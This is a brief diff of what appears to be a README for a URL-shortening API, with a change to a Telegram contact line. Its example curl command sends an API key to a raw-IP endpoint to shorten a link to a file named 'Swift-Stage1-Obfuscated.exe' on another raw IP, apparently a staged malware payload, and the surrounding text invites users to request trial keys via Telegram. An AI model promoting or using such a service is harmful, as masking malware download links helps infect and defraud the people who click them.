@@ -6,7 +6,7 @@
 
 curl -X POST "http://68.183.131.15:8080/shorten?api_key=ofXOboYY2Om2TTl5" -H "Content-Type: application/json" -d '{"url": "http://169.1.16.29/Swift-Stage1-Obfuscated.exe"}'
 
-📩 Message at Telegram id @kalkimahavatar to get your trial API key!
+📩 Message at our Telegram id to get your trial API key!
 
 🚀 Stay safe and happy shortening! 😊
 
